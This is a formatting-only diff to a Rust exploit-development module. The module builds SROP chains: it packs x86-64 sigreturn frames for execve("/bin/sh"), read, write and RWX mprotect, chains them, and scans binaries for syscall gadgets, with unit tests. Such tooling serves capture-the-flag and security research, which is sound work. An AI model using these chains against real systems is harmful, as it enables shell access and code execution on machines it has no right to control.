@@ -89,7 +89,7 @@ impl SigreturnFrameX64 {
     pub fn new() -> Self {
         Self::default()
     }
-    
+
     /// Set registers for execve("/bin/sh", NULL, NULL)
     pub fn set_execve_binsh(&mut self, binsh_addr: u64, syscall_addr: u64) {
         self.rax = 59; // sys_execve
@@ -98,7 +98,7 @@ impl SigreturnFrameX64 {
         self.rdx = 0;
         self.rip = syscall_addr;
     }
-    
+
     /// Set registers for read(0, buffer, size)
     pub fn set_read(&mut self, buffer: u64, size: u64, syscall_addr: u64) {
         self.rax = 0; // sys_read
@@ -107,7 +107,7 @@ impl SigreturnFrameX64 {
         self.rdx = size;
         self.rip = syscall_addr;
     }
-    
+
     /// Set registers for write(1, buffer, size)
     pub fn set_write(&mut self, buffer: u64, size: u64, syscall_addr: u64) {
         self.rax = 1; // sys_write
@@ -116,7 +116,7 @@ impl SigreturnFrameX64 {
         self.rdx = size;
         self.rip = syscall_addr;
     }
-    
+
     /// Set registers for mprotect(addr, size, prot)
     pub fn set_mprotect(&mut self, addr: u64, size: u64, prot: u64, syscall_addr: u64) {
         self.rax = 10; // sys_mprotect
@@ -125,11 +125,11 @@ impl SigreturnFrameX64 {
         self.rdx = prot; // PROT_READ | PROT_WRITE | PROT_EXEC = 7
         self.rip = syscall_addr;
     }
-    
+
     /// Convert frame to bytes
     pub fn to_bytes(&self) -> Vec<u8> {
         let mut bytes = Vec::with_capacity(std::mem::size_of::<Self>());
-        
+
         // Pack all fields as little-endian u64
         bytes.extend_from_slice(&self.uc_flags.to_le_bytes());
         bytes.extend_from_slice(&self.uc_link.to_le_bytes());
@@ -163,11 +163,11 @@ impl SigreturnFrameX64 {
         bytes.extend_from_slice(&self.oldmask.to_le_bytes());
         bytes.extend_from_slice(&self.cr2.to_le_bytes());
         bytes.extend_from_slice(&self.fpstate.to_le_bytes());
-        
+
         for &val in &self.__reserved1 {
             bytes.extend_from_slice(&val.to_le_bytes());
         }
-        
+
         bytes
     }
 }
@@ -184,59 +184,56 @@ impl SropBuilder {
     pub fn new() -> Self {
         Self::default()
     }
-    
+
     /// Set the syscall gadget address
     pub fn set_syscall(&mut self, addr: u64) {
         self.syscall_gadget = Some(addr);
     }
-    
+
     /// Add a frame for execve("/bin/sh")
     pub fn add_execve(&mut self, binsh_addr: u64) -> Result<(), String> {
-        let syscall = self.syscall_gadget
-            .ok_or("Syscall gadget not set")?;
-        
+        let syscall = self.syscall_gadget.ok_or("Syscall gadget not set")?;
+
         let mut frame = SigreturnFrameX64::new();
         frame.set_execve_binsh(binsh_addr, syscall);
         self.frames.push(frame);
-        
+
         log::info!("Added execve frame");
         Ok(())
     }
-    
+
     /// Add a frame for read(0, buffer, size)
     pub fn add_read(&mut self, buffer: u64, size: u64) -> Result<(), String> {
-        let syscall = self.syscall_gadget
-            .ok_or("Syscall gadget not set")?;
-        
+        let syscall = self.syscall_gadget.ok_or("Syscall gadget not set")?;
+
         let mut frame = SigreturnFrameX64::new();
         frame.set_read(buffer, size, syscall);
         self.frames.push(frame);
-        
+
         log::info!("Added read frame");
         Ok(())
     }
-    
+
     /// Add a frame for mprotect to make memory executable
     pub fn add_mprotect(&mut self, addr: u64, size: u64) -> Result<(), String> {
-        let syscall = self.syscall_gadget
-            .ok_or("Syscall gadget not set")?;
-        
+        let syscall = self.syscall_gadget.ok_or("Syscall gadget not set")?;
+
         let mut frame = SigreturnFrameX64::new();
         frame.set_mprotect(addr, size, 7, syscall); // RWX
         self.frames.push(frame);
-        
+
         log::info!("Added mprotect frame");
         Ok(())
     }
-    
+
     /// Build the complete SROP chain
     pub fn build(&self) -> Vec<u8> {
         let mut chain = Vec::new();
-        
+
         for frame in &self.frames {
             chain.extend_from_slice(&frame.to_bytes());
         }
-        
+
         log::info!("Built SROP chain: {} bytes", chain.len());
         chain
     }
@@ -280,12 +277,11 @@ pub fn srop_mprotect(addr: u64, size: u64, syscall_gadget: u64) -> Vec<u8> {
 /// Find syscall/sigreturn gadgets in binary
 pub fn find_srop_gadgets(binary_path: &str) -> Result<HashMap<String, u64>, String> {
     use std::fs;
-    
-    let data = fs::read(binary_path)
-        .map_err(|e| format!("Failed to read binary: {}", e))?;
-    
+
+    let data = fs::read(binary_path).map_err(|e| format!("Failed to read binary: {}", e))?;
+
     let mut gadgets = HashMap::new();
-    
+
     // Search for syscall (0x0f 0x05)
     for (i, window) in data.windows(2).enumerate() {
         if window == [0x0f, 0x05] {
@@ -294,7 +290,7 @@ pub fn find_srop_gadgets(binary_path: &str) -> Result<HashMap<String, u64>, Stri
             break; // First one is usually good enough
         }
     }
-    
+
     // Search for int 0x80 (0xcd 0x80)
     for (i, window) in data.windows(2).enumerate() {
         if window == [0xcd, 0x80] {
@@ -303,7 +299,7 @@ pub fn find_srop_gadgets(binary_path: &str) -> Result<HashMap<String, u64>, Stri
             break;
         }
     }
-    
+
     Ok(gadgets)
 }
 
@@ -322,7 +318,7 @@ mod tests {
     fn test_srop_frame_execve() {
         let mut frame = SigreturnFrameX64::new();
         frame.set_execve_binsh(0x600000, 0x400500);
-        
+
         assert_eq!(frame.rax, 59); // execve
         assert_eq!(frame.rdi, 0x600000);
         assert_eq!(frame.rip, 0x400500);
@@ -332,7 +328,7 @@ mod tests {
     fn test_srop_frame_to_bytes() {
         let frame = SigreturnFrameX64::new();
         let bytes = frame.to_bytes();
-        
+
         // Frame should be 248 bytes
         assert!(bytes.len() >= 200);
     }
@@ -341,10 +337,10 @@ mod tests {
     fn test_srop_builder() {
         let mut builder = SropBuilder::new();
         builder.set_syscall(0x400500);
-        
+
         assert!(builder.add_execve(0x600000).is_ok());
         assert_eq!(builder.frames.len(), 1);
-        
+
         let chain = builder.build();
         assert!(!chain.is_empty());
     }
